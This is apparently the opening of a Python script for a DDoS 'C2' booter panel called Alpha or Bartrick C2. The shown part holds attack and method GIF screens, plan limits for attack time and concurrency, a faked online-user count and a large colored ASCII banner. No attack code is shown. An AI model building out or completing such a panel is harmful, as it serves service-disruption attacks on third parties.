import socket
import os
import requests
import random
from pystyle import Colors, Colorate, Center
from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication
import getpass
import time
from time import sleep
import sys
ip= requests.get('https://api.ipify.org').text.strip()
online= random.randint(1, 153)


###Help Gif###
def hlp(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "help.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 24))

    screen.play(scenes, stop_on_resize=False, repeat=False)
###Attack gif###
def atk(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "atk.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 21))

    screen.play(scenes, stop_on_resize=False, repeat=False)
###Method gif###
def mthd(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "methods.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=0.5),
    ]
    scenes.append(Scene(effects, 20))

    screen.play(scenes, stop_on_resize=False, repeat=False)

###COPYRIGHT tool###
def si():
    print('')

###Account###
def account():
    print(f"""
[38;2;255;255;255m [38;2;244;245;254m [38;2;233;235;253m [38;2;222;225;252mP[38;2;211;215;251ml[38;2;200;205;250ma[38;2;189;195;249mn[38;2;178;185;248m [38;2;167;175;247mA[38;2;156;165;246mc[38;2;145;155;245mc[38;2;134;145;244mo[38;2;123;135;243mu[38;2;112;125;242mn[38;2;101;115;241mt[38;2;90;105;240m [38;2;79;95;239mY[38;2;68;85;238mO[38;2;57;75;237mU[38;2;46;65;236m [38;2;35;55;235m!
[38;2;255;255;255m [38;2;248;249;254m [38;2;241;243;253m [38;2;234;237;252mA[38;2;227;231;251mt[38;2;220;225;250mt[38;2;213;219;249ma[38;2;206;213;248mc[38;2;199;207;247mk[38;2;192;201;246m [38;2;185;195;245mM[38;2;178;189;244ma[38;2;171;183;243mx[38;2;164;177;242m [38;2;157;171;241mT[38;2;150;165;240mi[38;2;143;159;239mm[38;2;136;153;238me[38;2;129;147;237m [38;2;122;141;236m:[38;2;115;135;235m [38;2;108;129;234m4[38;2;101;123;233m5[38;2;94;117;232m [38;2;87;111;231mD[38;2;80;105;230mu[38;2;73;99;229mr[38;2;66;93;228ma[38;2;59;87;227mt[38;2;52;81;226mi[38;2;45;75;225mo[38;2;38;69;224mn
[38;2;255;255;255m [38;2;244;245;254m [38;2;233;235;253m [38;2;222;225;252mA[38;2;211;215;251mt[38;2;200;205;250mt[38;2;189;195;249ma[38;2;178;185;248mc[38;2;167;175;247mk[38;2;156;165;246m [38;2;145;155;245mC[38;2;134;145;244mo[38;2;123;135;243mn[38;2;112;125;242mc[38;2;101;115;241m [38;2;90;105;240m:[38;2;79;95;239m [38;2;68;85;238m1[38;2;57;75;237m/[38;2;46;65;236m3
[38;2;255;255;255m [38;2;237;238;253m [38;2;219;221;251m [38;2;201;204;249mV[38;2;183;187;247mi[38;2;165;170;245mp[38;2;147;153;243m [38;2;129;136;241m:[38;2;111;119;239m [38;2;93;102;237mY[38;2;75;85;235me[38;2;57;68;233ms
[38;2;255;255;255m [38;2;243;244;254m [38;2;231;233;253m [38;2;219;222;252mB[38;2;207;211;251ml[38;2;195;200;250ma[38;2;183;189;249mc[38;2;171;178;248mk[38;2;159;167;247mf[38;2;147;156;246mi[38;2;135;145;245ms[38;2;123;134;244m [38;2;111;123;243m:[38;2;99;112;242m [38;2;87;101;241mT[38;2;75;90;240mr[38;2;63;79;239mu[38;2;51;68;238me[38;2;39;57;237ml
[38;2;255;255;255m [38;2;194;198;247m [38;2;133;141;239m 
[38;2;255;255;255m [38;2;244;245;254m [38;2;233;235;253m [38;2;222;225;252mA[38;2;211;215;251md[38;2;200;205;250mm[38;2;189;195;249mi[38;2;178;185;248mn[38;2;167;175;247m [38;2;156;165;246m:[38;2;145;155;245m [38;2;134;145;244mA[38;2;123;135;243mn[38;2;112;125;242mo[38;2;101;115;241mn[38;2;90;105;240m [38;2;79;95;239mx[38;2;68;85;238mG[38;2;57;75;237mr[38;2;46;65;236me[38;2;35;55;235mm
[38;2;255;255;255m [38;2;245;245;254m [38;2;235;235;253m [38;2;225;225;252mD[38;2;215;215;251me[38;2;205;205;250mv[38;2;195;195;249m [38;2;185;185;248mT[38;2;175;175;247mo[38;2;165;165;246mo[38;2;155;155;245ml[38;2;145;145;244m [38;2;135;135;243m:[38;2;125;125;242m [38;2;115;115;241mH[38;2;105;105;240ma[38;2;95;95;239mi[38;2;85;85;238m [38;2;75;75;237mB[38;2;65;65;236me[38;2;55;55;235m [38;2;45;45;234mD[38;2;35;35;233mz
[0;00m""")


def menu():
    sys.stdout.write(f"\x1b]2;Welcome To Alpha C2\x07")
    os.system('cls' if os.name == 'nt' else 'clear')
    si()
    print(f"""
[38;2;255;255;255m [38;2;252;252;255m [38;2;249;249;255mW[38;2;246;246;255me[38;2;243;243;255ml[38;2;240;240;255mc[38;2;237;237;255mo[38;2;234;234;255mm[38;2;231;231;255me[38;2;228;228;255m [38;2;225;225;255mT[38;2;222;222;255mo[38;2;219;219;255m [38;2;216;216;255mB[38;2;213;213;255ma[38;2;210;210;255mr[38;2;207;207;255mt[38;2;204;204;255mr[38;2;201;201;255mi[38;2;198;198;255mc[38;2;195;195;255mk[38;2;192;192;255m [38;2;189;189;255mC[38;2;186;186;255m2[38;2;183;183;255m [38;2;180;180;255m [38;2;177;177;255m [38;2;174;174;255m [38;2;171;171;255m [38;2;168;168;255m [38;2;165;165;255m [38;2;162;162;255m [38;2;159;159;255m [38;2;156;156;255m [38;2;153;153;255m [38;2;150;150;255m [38;2;147;147;255m [38;2;144;144;255m [38;2;141;141;255m [38;2;138;138;255m [38;2;135;135;255mA[38;2;132;132;255md[38;2;129;129;255mm[38;2;126;126;255mi[38;2;123;123;255mn[38;2;120;120;255m [38;2;117;117;255m:[38;2;114;114;255m [38;2;111;111;255mH[38;2;108;108;255ma[38;2;105;105;255mi[38;2;102;102;255mB[38;2;99;99;255me[38;2;96;96;255m [38;2;93;93;255mD[38;2;90;90;255mz[38;2;87;87;255m [38;2;84;84;255m•[38;2;81;81;255m [38;2;78;78;255mA[38;2;75;75;255mn[38;2;72;72;255mo[38;2;69;69;255mn[38;2;66;66;255m [38;2;63;63;255mx[38;2;60;60;255mG[38;2;57;57;255mr[38;2;54;54;255me[38;2;51;51;255mm
[38;2;255;255;255m [38;2;252;252;255m╔[38;2;249;249;255m═[38;2;246;246;255m═[38;2;243;243;255m═[38;2;240;240;255m═[38;2;237;237;255m═[38;2;234;234;255m═[38;2;231;231;255m═[38;2;228;228;255m═[38;2;225;225;255m═[38;2;222;222;255m═[38;2;219;219;255m═[38;2;216;216;255m═[38;2;213;213;255m═[38;2;210;210;255m═[38;2;207;207;255m═[38;2;204;204;255m═[38;2;201;201;255m═[38;2;198;198;255m═[38;2;195;195;255m═[38;2;192;192;255m═[38;2;189;189;255m═[38;2;186;186;255m═[38;2;183;183;255m═[38;2;180;180;255m═[38;2;177;177;255m═[38;2;174;174;255m═[38;2;171;171;255m═[38;2;168;168;255m═[38;2;165;165;255m═[38;2;162;162;255m═[38;2;159;159;255m═[38;2;156;156;255m═[38;2;153;153;255m═[38;2;150;150;255m═[38;2;147;147;255m═[38;2;144;144;255m═[38;2;141;141;255m═[38;2;138;138;255m═[38;2;135;135;255m═[38;2;132;132;255m═[38;2;129;129;255m═[38;2;126;126;255m═[38;2;123;123;255m═[38;2;120;120;255m═[38;2;117;117;255m═[38;2;114;114;255m═[38;2;111;111;255m═[38;2;108;108;255m═[38;2;105;105;255m═[38;2;102;102;255m═[38;2;99;99;255m═[38;2;96;96;255m═[38;2;93;93;255m═[38;2;90;90;255m═[38;2;87;87;255m═[38;2;84;84;255m═[38;2;81;81;255m═[38;2;78;78;255m═[38;2;75;75;255m═[38;2;72;72;255m═[38;2;69;69;255m═[38;2;66;66;255m═[38;2;63;63;255m═[38;2;60;60;255m═[38;2;57;57;255m═[38;2;54;54;255m═[38;2;51;51;255m═[38;2;48;48;255m╗
[38;2;255;255;255m [38;2;252;252;255m║[38;2;249;249;255m [38;2;246;246;255m⣿[38;2;243;243;255m⣿[38;2;240;240;255m⣿[38;2;237;237;255m⣿[38;2;234;234;255m⣿[38;2;231;231;255m⣿[38;2;228;228;255m⣿[38;2;225;225;255m⣿[38;2;222;222;255m⣿[38;2;219;219;255m⣿[38;2;216;216;255m⣿[38;2;213;213;255m⣿[38;2;210;210;255m⣿[38;2;207;207;255m⣿[38;2;204;204;255m⣿[38;2;201;201;255m⣿[38;2;198;198;255m⣿[38;2;195;195;255m⣿[38;2;192;192;255m⣿[38;2;189;189;255m⣿[38;2;186;186;255m⣿[38;2;183;183;255m⣿[38;2;180;180;255m⣿[38;2;177;177;255m⣿[38;2;174;174;255m⣿[38;2;171;171;255m⣿[38;2;168;168;255m⣿[38;2;165;165;255m⣿[38;2;162;162;255m⣿[38;2;159;159;255m⣿[38;2;156;156;255m⣿[38;2;153;153;255m⣿[38;2;150;150;255m⣿[38;2;147;147;255m⣿[38;2;144;144;255m⣿[38;2;141;141;255m⣿[38;2;138;138;255m⣿[38;2;135;135;255m⣿[38;2;132;132;255m⣿[38;2;129;129;255m⣿[38;2;126;126;255m⣿[38;2;123;123;255m⣿[38;2;120;120;255m⣿[38;2;117;117;255m⣿[38;2;114;114;255m⣿[38;2;111;111;255m⣿[38;2;108;108;255m⣿[38;2;105;105;255m⣿[38;2;102;102;255m⣿[38;2;99;99;255m⣿[38;2;96;96;255m⣿[38;2;93;93;255m⣿[38;2;90;90;255m⣿[38;2;87;87;255m⣿[38;2;84;84;255m⣿[38;2;81;81;255m⣿[38;2;78;78;255m⣿[38;2;75;75;255m⣿[38;2;72;72;255m⣿[38;2;69;69;255m⣿[38;2;66;66;255m⣿[38;2;63;63;255m⣿[38;2;60;60;255m⣿[38;2;57;57;255m⣿[38;2;54;54;255m⣿[38;2;51;51;255m [38;2;48;48;255m║
[38;2;255;255;255m [38;2;252;252;255m║[38;2;249;249;255m [38;2;246;246;255m⣿[38;2;243;243;255m⣿[38;2;240;240;255m⣿[38;2;237;237;255m⣿[38;2;234;234;255m⣿[38;2;231;231;255m⣿[38;2;228;228;255m⣿[38;2;225;225;255m⣿[38;2;222;222;255m⣿[38;2;219;219;255m⣿[38;2;216;216;255m⣿[38;2;213;213;255m⣿[38;2;210;210;255m⣿[38;2;207;207;255m⣿[38;2;204;204;255m⣿[38;2;201;201;255m⣿[38;2;198;198;255m⣿[38;2;195;195;255m⣿[38;2;192;192;255m⣿[38;2;189;189;255m⣿[38;2;186;186;255m⣿[38;2;183;183;255m⣿[38;2;180;180;255m⣿[38;2;177;177;255m⣿[38;2;174;174;255m⣿[38;2;171;171;255m⣿[38;2;168;168;255m⣿[38;2;165;165;255m⣿[38;2;162;162;255m⣿[38;2;159;159;255m⣿[38;2;156;156;255m⣿[38;2;153;153;255m⣿[38;2;150;150;255m⣿[38;2;147;147;255m⣿[38;2;144;144;255m⣿[38;2;141;141;255m⣿[38;2;138;138;255m⣿[38;2;135;135;255m⣿[38;2;132;132;255m⣿[38;2;129;129;255m⣿[38;2;126;126;255m⣿[38;2;123;123;255m⣿[38;2;120;120;255m⣿[38;2;117;117;255m⣿[38;2;114;114;255m⣿[38;2;111;111;255m⣿[38;2;108;108;255m⣿[38;2;105;105;255m⣿[38;2;102;102;255m⣿[38;2;99;99;255m⣿[38;2;96;96;255m⣿[38;2;93;93;255m⣿[38;2;90;90;255m⣿[38;2;87;87;255m⣿[38;2;84;84;255m⣿[38;2;81;81;255m⣿[38;2;78;78;255m⣿[38;2;75;75;255m⣿[38;2;72;72;255m⣿[38;2;69;69;255m⣿[38;2;66;66;255m⣿[38;2;63;63;255m⣿[38;2;60;60;255m⣿[38;2;57;57;255m⣿[38;2;54;54;255m⣿[38;2;51;51;255m [38;2;48;48;255m║
[38;2;255;255;255m [38;2;252;252;255m║[38;2;249;249;255m [38;2;246;246;255m⣿[38;2;243;243;255m⣿[38;2;240;240;255m⣿[38;2;237;237;255m⣿[38;2;234;234;255m⣿[38;2;231;231;255m⣿[38;2;228;228;255m⣿[38;2;225;225;255m⣿[38;2;222;222;255m⣿[38;2;219;219;255m⣹[38;2;216;216;255m⢿[38;2;213;213;255m⣉[38;2;210;210;255m⣉[38;2;207;207;255m⠿[38;2;204;204;255m⢿[38;2;201;201;255m⣿[38;2;198;198;255m⣿[38;2;195;195;255m⣿[38;2;192;192;255m⣿[38;2;189;189;255m⣿[38;2;186;186;255m⣿[38;2;183;183;255m⣿[38;2;180;180;255m⣿[38;2;177;177;255m⣿[38;2;174;174;255m⣿[38;2;171;171;255m⣿[38;2;168;168;255m⣿[38;2;165;165;255m⣿[38;2;162;162;255m⣿[38;2;159;159;255m⣿[38;2;156;156;255m⣿[38;2;153;153;255m⣿[38;2;150;150;255m⣿[38;2;147;147;255m⣿[38;2;144;144;255m⣿[38;2;141;141;255m⣿[38;2;138;138;255m⣿[38;2;135;135;255m⣿[38;2;132;132;255m⣿[38;2;129;129;255m⣿[38;2;126;126;255m⣿[38;2;123;123;255m⣿[38;2;120;120;255m⣿[38;2;117;117;255m⣿[38;2;114;114;255m⣿[38;2;111;111;255m⣿[38;2;108;108;255m⣿[38;2;105;105;255m⣿[38;2;102;102;255m⣿[38;2;99;99;255m⣿[38;2;96;96;255m⣿[38;2;93;93;255m⣿[38;2;90;90;255m⣿[38;2;87;87;255m⣿[38;2;84;84;255m⣿[38;2;81;81;255m⣿[38;2;78;78;255m⡿[38;2;75;75;255m⠀[38;2;72;72;255m⣏[38;2;69;69;255m⣹[38;2;66;66;255m⣿[38;2;63;63;255m⣿[38;2;60;60;255m⣿[38;2;57;57;255m⣿[38;2;54;54;255m⣿[38;2;51;51;255m [38;2;48;48;255m║
[38;2;255;255;255m [38;2;252;252;255m║[38;2;249;249;255m [38;2;246;246;255m⣿[38;2;243;243;255m⣿[38;2;240;240;255m⣿[38;2;237;237;255m⣿[38;2;234;234;255m⣿[38;2;231;231;255m⣿[38;2;228;228;255m⣿[38;2;225;225;255m⣿[38;2;222;222;255m⡵[38;2;219;219;255m⠀[38;2;216;216;255m⣿[38;2;213;213;255m⣿[38;2;210;210;255m⣿[38;2;207;207;255m⣆[38;2;204;204;255m⠈[38;2;201;201;255m⣿[38;2;198;198;255m⣿[38;2;195;195;255m⣿[38;2;192;192;255m⣿[38;2;189;189;255m⣿[38;2;186;186;255m⣿[38;2;183;183;255m⣿[38;2;180;180;255m⣿[38;2;177;177;255m⣿[38;2;174;174;255m⣿[38;2;171;171;255m⣿[38;2;168;168;255m⣿[38;2;165;165;255m⣿[38;2;162;162;255m⣿[38;2;159;159;255m⣿[38;2;156;156;255m⣿[38;2;153;153;255m⣿[38;2;150;150;255m⣿[38;2;147;147;255m⣿[38;2;144;144;255m⡟[38;2;141;141;255m⠉[38;2;138;138;255m⣽[38;2;135;135;255m⣿[38;2;132;132;255m⣿[38;2;129;129;255m⣿[38;2;126;126;255m⣿[38;2;123;123;255m⣿[38;2;120;120;255m⣿[38;2;117;117;255m⣿[38;2;114;114;255m⣿[38;2;111;111;255m⣿[38;2;108;108;255m⠟[38;2;105;105;255m⠛[38;2;102;102;255m⣿[38;2;99;99;255m⣿[38;2;96;96;255m⣿[38;2;93;93;255m⣿[38;2;90;90;255m⣿[38;2;87;87;255m⣿[38;2;84;84;255m⣿[38;2;81;81;255m⣿[38;2;78;78;255m⠁[38;2;75;75;255m⢸[38;2;72;72;255m⣿[38;2;69;69;255m⣼[38;2;66;66;255m⣿[38;2;63;63;255m⣿[38;2;60;60;255m⣿[38;2;57;57;255m⣿[38;2;54;54;255m⣿[38;2;51;51;255m [38;2;48;48;255m║
[38;2;255;255;255m [38;2;252;252;255m║[38;2;249;249;255m [38;2;246;246;255m⣿[38;2;243;243;255m⣿[38;2;240;240;255m⣿[38;2;237;237;255m⣿[38;2;234;234;255m⣿[38;2;231;231;255m⣿[38;2;228;228;255m⣿[38;2;225;225;255m⣿[38;2;222;222;255m⠃[38;2;219;219;255m⢀[38;2;216;216;255m⣿[38;2;213;213;255m⣿[38;2;210;210;255m⡿[38;2;207;207;255m⠃[38;2;204;204;255m⣠[38;2;201;201;255m⣿[38;2;198;198;255m⣿[38;2;195;195;255m⣿[38;2;192;192;255m⣿[38;2;189;189;255m⣿[38;2;186;186;255m⣿[38;2;183;183;255m⣿[38;2;180;180;255m⣿[38;2;177;177;255m⣿[38;2;174;174;255m⣿[38;2;171;171;255m⣿[38;2;168;168;255m⣿[38;2;165;165;255m⣿[38;2;162;162;255m⣿[38;2;159;159;255m⣿[38;2;156;156;255m⣿[38;2;153;153;255m⣿[38;2;150;150;255m⣿[38;2;147;147;255m⠿[38;2;144;144;255m⠁[38;2;141;141;255m⡰[38;2;138;138;255m⠿[38;2;135;135;255m⢿[38;2;132;132;255m⣿[38;2;129;129;255m⣿[38;2;126;126;255m⣿[38;2;123;123;255m⣿[38;2;120;120;255m⣿[38;2;117;117;255m⣿[38;2;114;114;255m⣿[38;2;111;111;255m⣿[38;2;108;108;255m⣶[38;2;105;105;255m⣾[38;2;102;102;255m⣿[38;2;99;99;255m⣿[38;2;96;96;255m⣿[38;2;93;93;255m⣿[38;2;90;90;255m⣿[38;2;87;87;255m⣿[38;2;84;84;255m⣿[38;2;81;81;255m⡏[38;2;78;78;255m⠀[38;2;75;75;255m⢿[38;2;72;72;255m⣾[38;2;69;69;255m⣿[38;2;66;66;255m⣿[38;2;63;63;255m⣿[38;2;60;60;255m⣿[38;2;57;57;255m⣿[38;2;54;54;255m⣿[38;2;51;51;255m [38;2;48;48;255m║
[38;2;255;255;255m [38;2;252;252;255m║[38;2;249;249;255m [38;2;246;246;255m⣿[38;2;243;243;255m⣿[38;2;240;240;255m⣿[38;2;237;237;255m⣿[38;2;234;234;255m⣿[38;2;231;231;255m⣧[38;2;228;228;255m⣸[38;2;225;225;255m⠏[38;2;222;222;255m⠀[38;2;219;219;255m⣾[38;2;216;216;255m⣟[38;2;213;213;255m⣦[38;2;210;210;255m⣤[38;2;207;207;255m⡈[38;2;204;204;255m⠻[38;2;201;201;255m⣿[38;2;198;198;255m⣿[38;2;195;195;255m⡿[38;2;192;192;255m⢛[38;2;189;189;255m⣩[38;2;186;186;255m⣭[38;2;183;183;255m⡙[38;2;180;180;255m⠋[38;2;177;177;255m⣻[38;2;174;174;255m⣿[38;2;171;171;255m⣿[38;2;168;168;255m⣿[38;2;165;165;255m⠉[38;2;162;162;255m⢹[38;2;159;159;255m⠟[38;2;156;156;255m⢋[38;2;153;153;255m⣡[38;2;150;150;255m⣿[38;2;147;147;255m⠃[38;2;144;144;255m⢠[38;2;141;141;255m⣿[38;2;138;138;255m⣿[38;2;135;135;255m⣿[38;2;132;132;255m⡿[38;2;129;129;255m⠉[38;2;126;126;255m⢻[38;2;123;123;255m⠟[38;2;120;120;255m⣉[38;2;117;117;255m⣨[38;2;114;114;255m⡿[38;2;111;111;255m⠉[38;2;108;108;255m⣹[38;2;105;105;255m⣿[38;2;102;102;255m⡿[38;2;99;99;255m⠛[38;2;96;96;255m⣉[38;2;93;93;255m⣭[38;2;90;90;255m⠉[38;2;87;87;255m⢻[38;2;84;84;255m⡿[38;2;81;81;255m⠀[38;2;78;78;255m⣰[38;2;75;75;255m⡿[38;2;72;72;255m⢋[38;2;69;69;255m⣉[38;2;66;66;255m⣽[38;2;63;63;255m⣿[38;2;60;60;255m⣿[38;2;57;57;255m⣿[38;2;54;54;255m⣿[38;2;51;51;255m [38;2;48;48;255m║
[38;2;255;255;255m [38;2;252;252;255m║[38;2;249;249;255m [38;2;246;246;255m⣿[38;2;243;243;255m⣿[38;2;240;240;255m⣿[38;2;237;237;255m⣿[38;2;234;234;255m⠿[38;2;231;231;255m⣿[38;2;228;228;255m⡟[38;2;225;225;255m⠀[38;2;222;222;255m⣼[38;2;219;219;255m⣿[38;2;216;216;255m⣿[38;2;213;213;255m⣿[38;2;210;210;255m⣿[38;2;207;207;255m⡇[38;2;204;204;255m⠀[38;2;201;201;255m⢿[38;2;198;198;255m⠋[38;2;195;195;255m⢀[38;2;192;192;255m⣾[38;2;189;189;255m⣿[38;2;186;186;255m⡿[38;2;183;183;255m⠁[38;2;180;180;255m⢠[38;2;177;177;255m⣿[38;2;174;174;255m⣿[38;2;171;171;255m⣿[38;2;168;168;255m⠏[38;2;165;165;255m⠀[38;2;162;162;255m⣬[38;2;159;159;255m⣾[38;2;156;156;255m⣛[38;2;153;153;255m⣿[38;2;150;150;255m⠃[38;2;147;147;255m⢀[38;2;144;144;255m⣾[38;2;141;141;255m⣿[38;2;138;138;255m⣿[38;2;135;135;255m⣿[38;2;132;132;255m⠃[38;2;129;129;255m⢀[38;2;126;126;255m⣷[38;2;123;123;255m⣦[38;2;120;120;255m⣟[38;2;117;117;255m⡻[38;2;114;114;255m⠁[38;2;111;111;255m⢰[38;2;108;108;255m⣿[38;2;105;105;255m⡟[38;2;102;102;255m⠁[38;2;99;99;255m⣰[38;2;96;96;255m⣿[38;2;93;93;255m⣿[38;2;90;90;255m⣷[38;2;87;87;255m⣿[38;2;84;84;255m⠃[38;2;81;81;255m⢠[38;2;78;78;255m⠉[38;2;75;75;255m⠰[38;2;72;72;255m⣿[38;2;69;69;255m⣿[38;2;66;66;255m⡿[38;2;63;63;255m⣿[38;2;60;60;255m⣿[38;2;57;57;255m⣿[38;2;54;54;255m⣿[38;2;51;51;255m [38;2;48;48;255m║
[38;2;255;255;255m [38;2;252;252;255m║[38;2;249;249;255m [38;2;246;246;255m⣿[38;2;243;243;255m⣿[38;2;240;240;255m⡿[38;2;237;237;255m⣷[38;2;234;234;255m⡾[38;2;231;231;255m⠋[38;2;228;228;255m⣠[38;2;225;225;255m⣦[38;2;222;222;255m⡈[38;2;219;219;255m⠻[38;2;216;216;255m⣿[38;2;213;213;255m⡿[38;2;210;210;255m⠟[38;2;207;207;255m⢀[38;2;204;204;255m⣰[38;2;201;201;255m⣿[38;2;198;198;255m⡀[38;2;195;195;255m⠸[38;2;192;192;255m⣿[38;2;189;189;255m⠟[38;2;186;186;255m⡅[38;2;183;183;255m⠀[38;2;180;180;255m⡿[38;2;177;177;255m⣻[38;2;174;174;255m⣿[38;2;171;171;255m⡟[38;2;168;168;255m⠀[38;2;165;165;255m⣰[38;2;162;162;255m⣿[38;2;159;159;255m⣿[38;2;156;156;255m⣿[38;2;153;153;255m⣯[38;2;150;150;255m⠀[38;2;147;147;255m⡼[38;2;144;144;255m⢿[38;2;141;141;255m⣻[38;2;138;138;255m⣿[38;2;135;135;255m⠏[38;2;132;132;255m⠀[38;2;129;129;255m⣼[38;2;126;126;255m⣿[38;2;123;123;255m⣿[38;2;120;120;255m⣿[38;2;117;117;255m⠃[38;2;114;114;255m⢀[38;2;111;111;255m⠟[38;2;108;108;255m⣻[38;2;105;105;255m⣇[38;2;102;102;255m⠀[38;2;99;99;255m⢿[38;2;96;96;255m⣿[38;2;93;93;255m⠟[38;2;90;90;255m⣫[38;2;87;87;255m⠆[38;2;84;84;255m⠀[38;2;81;81;255m⣼[38;2;78;78;255m⣆[38;2;75;75;255m⠀[38;2;72;72;255m⣿[38;2;69;69;255m⠟[38;2;66;66;255m⣿[38;2;63;63;255m⣿[38;2;60;60;255m⣿[38;2;57;57;255m⣿[38;2;54;54;255m⣿[38;2;51;51;255m [38;2;48;48;255m║
[38;2;255;255;255m [38;2;252;252;255m║[38;2;249;249;255m [38;2;246;246;255m⣿[38;2;243;243;255m⣿[38;2;240;240;255m⣿[38;2;237;237;255m⣶[38;2;234;234;255m⣾[38;2;231;231;255m⣿[38;2;228;228;255m⣿[38;2;225;225;255m⣿[38;2;222;222;255m⣿[38;2;219;219;255m⣷[38;2;216;216;255m⣶[38;2;213;213;255m⣾[38;2;210;210;255m⣿[38;2;207;207;255m⣿[38;2;204;204;255m⣿[38;2;201;201;255m⣿[38;2;198;198;255m⣿[38;2;195;195;255m⣶[38;2;192;192;255m⣶[38;2;189;189;255m⣿[38;2;186;186;255m⣿[38;2;183;183;255m⣶[38;2;180;180;255m⣾[38;2;177;177;255m⣿[38;2;174;174;255m⣿[38;2;171;171;255m⣿[38;2;168;168;255m⣷[38;2;165;165;255m⣿[38;2;162;162;255m⣿[38;2;159;159;255m⣿[38;2;156;156;255m⣿[38;2;153;153;255m⣿[38;2;150;150;255m⣷[38;2;147;147;255m⣶[38;2;144;144;255m⣿[38;2;141;141;255m⣿[38;2;138;138;255m⣿[38;2;135;135;255m⣶[38;2;132;132;255m⣿[38;2;129;129;255m⣿[38;2;126;126;255m⣿[38;2;123;123;255m⣿[38;2;120;120;255m⣿[38;2;117;117;255m⣷[38;2;114;114;255m⣶[38;2;111;111;255m⣿[38;2;108;108;255m⣿[38;2;105;105;255m⣿[38;2;102;102;255m⣿[38;2;99;99;255m⣶[38;2;96;96;255m⣾[38;2;93;93;255m⣿[38;2;90;90;255m⣿[38;2;87;87;255m⣷[38;2;84;84;255m⣾[38;2;81;81;255m⣿[38;2;78;78;255m⣿[38;2;75;75;255m⣷[38;2;72;72;255m⣾[38;2;69;69;255m⣿[38;2;66;66;255m⣿[38;2;63;63;255m⣿[38;2;60;60;255m⣿[38;2;57;57;255m⣿[38;2;54;54;255m⣿[38;2;51;51;255m [38;2;48;48;255m║
[38;2;255;255;255m [38;2;252;252;255m║[38;2;249;249;255m [38;2;246;246;255m⣿[38;2;243;243;255m⣿[38;2;240;240;255m⣿[38;2;237;237;255m⣿[38;2;234;234;255m⣿[38;2;231;231;255m⣿[38;2;228;228;255m⣿[38;2;225;225;255m⣿[38;2;222;222;255m⣿[38;2;219;219;255m⣿[38;2;216;216;255m⣿[38;2;213;213;255m⣿[38;2;210;210;255m⣿[38;2;207;207;255m⣿[38;2;204;204;255m⣿[38;2;201;201;255m⣿[38;2;198;198;255m⣿[38;2;195;195;255m⣿[38;2;192;192;255m⣿[38;2;189;189;255m⣿[38;2;186;186;255m⣿[38;2;183;183;255m⣿[38;2;180;180;255m⣿[38;2;177;177;255m⣿[38;2;174;174;255m⣿[38;2;171;171;255m⣿[38;2;168;168;255m⣿[38;2;165;165;255m⣿[38;2;162;162;255m⣿[38;2;159;159;255m⣿[38;2;156;156;255m⣿[38;2;153;153;255m⣿[38;2;150;150;255m⣿[38;2;147;147;255m⣿[38;2;144;144;255m⣿[38;2;141;141;255m⣿[38;2;138;138;255m⣿[38;2;135;135;255m⣿[38;2;132;132;255m⣿[38;2;129;129;255m⣿[38;2;126;126;255m⣿[38;2;123;123;255m⣿[38;2;120;120;255m⣿[38;2;117;117;255m⣿[38;2;114;114;255m⣿[38;2;111;111;255m⣿[38;2;108;108;255m⣿[38;2;105;105;255m⣿[38;2;102;102;255m⣿[38;2;99;99;255m⣿[38;2;96;96;255m⣿[38;2;93;93;255m⣿[38;2;90;90;255m⣿[38;2;87;87;255m⣿[38;2;84;84;255m⣿[38;2;81;81;255m⣿[38;2;78;78;255m⣿[38;2;75;75;255m⣿[38;2;72;72;255m⣿[38;2;69;69;255m⣿[38;2;66;66;255m⣿[38;2;63;63;255m⣿[38;2;60;60;255m⣿[38;2;57;57;255m⣿[38;2;54;54;255m⣿[38;2;51;51;255m [38;2;48;48;255m║
[38;2;255;255;255m [38;2;252;252;255m║[38;2;249;249;255m [38;2;246;246;255m⣿[38;2;243;243;255m⣿[38;2;240;240;255m⣿[38;2;237;237;255m⣿[38;2;234;234;255m⣿[38;2;231;231;255m⣿[38;2;228;228;255m⣿[38;2;225;225;255m⣿[38;2;222;222;255m⣿[38;2;219;219;255m⣿[38;2;216;216;255m⣿[38;2;213;213;255m⣿[38;2;210;210;255m⣿[38;2;207;207;255m⣿[38;2;204;204;255m⣿[38;2;201;201;255m⣿[38;2;198;198;255m⣿[38;2;195;195;255m⣿[38;2;192;192;255m⣿[38;2;189;189;255m⣿[38;2;186;186;255m⣿[38;2;183;183;255m⣿[38;2;180;180;255m⣿[38;2;177;177;255m⣿[38;2;174;174;255m⣿[38;2;171;171;255m⣿[38;2;168;168;255m⣿[38;2;165;165;255m⣿[38;2;162;162;255m⣿[38;2;159;159;255m⣿[38;2;156;156;255m⣿[38;2;153;153;255m⣿[38;2;150;150;255m⣿[38;2;147;147;255m⣿[38;2;144;144;255m⣿[38;2;141;141;255m⣿[38;2;138;138;255m⣿[38;2;135;135;255m⣿[38;2;132;132;255m⣿[38;2;129;129;255m⣿[38;2;126;126;255m⣿[38;2;123;123;255m⣿[38;2;120;120;255m⣿[38;2;117;117;255m⣿[38;2;114;114;255m⣿[38;2;111;111;255m⣿[38;2;108;108;255m⣿[38;2;105;105;255m⣿[38;2;102;102;255m⣿[38;2;99;99;255m⣿[38;2;96;96;255m⣿[38;2;93;93;255m⣿[38;2;90;90;255m⣿[38;2;87;87;255m⣿[38;2;84;84;255m⣿[38;2;81;81;255m⣿[38;2;78;78;255m⣿[38;2;75;75;255m⣿[38;2;72;72;255m⣿[38;2;69;69;255m⣿[38;2;66;66;255m⣿[38;2;63;63;255m⣿[38;2;60;60;255m⣿[38;2;57;57;255m⣿[38;2;54;54;255m⣿[38;2;51;51;255m [38;2;48;48;255m║
